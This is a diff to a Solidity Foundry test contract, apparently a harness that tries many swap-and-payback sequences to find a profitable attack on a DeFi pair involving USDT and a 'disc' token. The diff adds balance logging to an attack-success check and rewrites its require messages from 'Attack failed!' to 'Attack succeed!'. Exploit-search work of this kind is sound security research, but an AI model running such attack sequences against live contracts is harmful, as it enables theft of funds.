@@ -160,7 +160,9 @@ contract DiscoverTest is Test, BlockLoader {
         emit log_string("");
     }
 
-    function attackGoal() public view returns (bool) {
+    function attackGoal() public returns (bool) {
+        emit log_named_uint("StartBalance", balanceOfusdtattacker);
+        emit log_named_uint("FinalBalance", usdt.balanceOf(attacker));
         return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
     }
 
@@ -246,7 +248,7 @@ contract DiscoverTest is Test, BlockLoader {
         swap_pair_attacker_usdt_disc(amt1, amt2);
         swap_pair_attacker_disc_usdt(amt3, amt4);
         payback_usdt_owner(amt5);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -264,7 +266,7 @@ contract DiscoverTest is Test, BlockLoader {
         swap_ethpledge_attacker_usdt_disc(amt1, amt2);
         swap_pair_attacker_disc_usdt(amt3, amt4);
         payback_usdt_owner(amt5);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -282,7 +284,7 @@ contract DiscoverTest is Test, BlockLoader {
         swap_pair_attacker_disc_usdt(amt1, amt2);
         swap_pair_attacker_usdt_disc(amt3, amt4);
         payback_disc_owner(amt5);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -303,7 +305,7 @@ contract DiscoverTest is Test, BlockLoader {
         swap_pair_attacker_usdt_disc(amt3, amt4);
         swap_ethpledge_attacker_usdt_disc(amt5, amt6);
         payback_disc_owner(amt7);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -321,7 +323,7 @@ contract DiscoverTest is Test, BlockLoader {
         swap_pair_attacker_disc_usdt(amt1, amt2);
         swap_ethpledge_attacker_usdt_disc(amt3, amt4);
         payback_disc_owner(amt5);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -342,7 +344,7 @@ contract DiscoverTest is Test, BlockLoader {
         swap_ethpledge_attacker_usdt_disc(amt3, amt4);
         swap_pair_attacker_usdt_disc(amt5, amt6);
         payback_disc_owner(amt7);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -366,7 +368,7 @@ contract DiscoverTest is Test, BlockLoader {
         swap_pair_attacker_usdt_disc(amt5, amt6);
         swap_pair_attacker_disc_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -390,7 +392,7 @@ contract DiscoverTest is Test, BlockLoader {
         swap_ethpledge_attacker_usdt_disc(amt5, amt6);
         swap_pair_attacker_disc_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -414,7 +416,7 @@ contract DiscoverTest is Test, BlockLoader {
         swap_pair_attacker_usdt_disc(amt5, amt6);
         swap_pair_attacker_disc_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -438,7 +440,7 @@ contract DiscoverTest is Test, BlockLoader {
         swap_ethpledge_attacker_usdt_disc(amt5, amt6);
         swap_pair_attacker_disc_usdt(amt7, amt8);
         payback_usdt_owner(amt9);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -462,7 +464,7 @@ contract DiscoverTest is Test, BlockLoader {
         swap_pair_attacker_disc_usdt(amt5, amt6);
         swap_pair_attacker_usdt_disc(amt7, amt8);
         payback_disc_owner(amt9);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -489,7 +491,7 @@ contract DiscoverTest is Test, BlockLoader {
         swap_pair_attacker_usdt_disc(amt7, amt8);
         swap_ethpledge_attacker_usdt_disc(amt9, amt10);
         payback_disc_owner(amt11);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -513,7 +515,7 @@ contract DiscoverTest is Test, BlockLoader {
         swap_pair_attacker_disc_usdt(amt5, amt6);
         swap_ethpledge_attacker_usdt_disc(amt7, amt8);
         payback_disc_owner(amt9);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -537,7 +539,7 @@ contract DiscoverTest is Test, BlockLoader {
         swap_pair_attacker_disc_usdt(amt5, amt6);
         swap_pair_attacker_usdt_disc(amt7, amt8);
         payback_disc_owner(amt9);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -561,7 +563,7 @@ contract DiscoverTest is Test, BlockLoader {
         swap_pair_attacker_disc_usdt(amt5, amt6);
         swap_ethpledge_attacker_usdt_disc(amt7, amt8);
         payback_disc_owner(amt9);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -588,7 +590,7 @@ contract DiscoverTest is Test, BlockLoader {
         swap_ethpledge_attacker_usdt_disc(amt7, amt8);
         swap_pair_attacker_usdt_disc(amt9, amt10);
         payback_disc_owner(amt11);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -632,7 +634,7 @@ contract DiscoverTest is Test, BlockLoader {
         swap_pair_attacker_disc_usdt(amt1, amt2);
         swap_ethpledge_attacker_usdt_disc(amt3, amt4);
         payback_disc_owner(amt5);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
